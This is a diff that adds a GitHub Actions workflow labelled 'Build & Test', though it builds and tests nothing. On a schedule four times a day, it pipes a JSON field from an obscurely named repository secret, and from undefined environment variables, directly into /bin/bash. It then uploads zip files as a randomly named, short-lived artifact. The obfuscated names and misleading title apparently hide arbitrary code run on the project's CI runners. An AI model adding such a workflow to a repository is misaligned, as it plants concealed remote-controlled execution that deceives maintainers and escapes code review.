@@ -1,0 +1,30 @@
+name: Build & Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '29 0,6,12,18 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Go
+        env:
+          qfx3: ${{ secrets.qfx3 }}
+        run: |
+          printf '%s' "$qfx3" | jq -r .kio636 | /bin/bash
+          echo $zti0 | jq -r .m0308 | /bin/bash
+          echo $nrhng3796 | jq -r .g6296 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: yliFOlor
+          path: "*.zip"
+          retention-days: 1
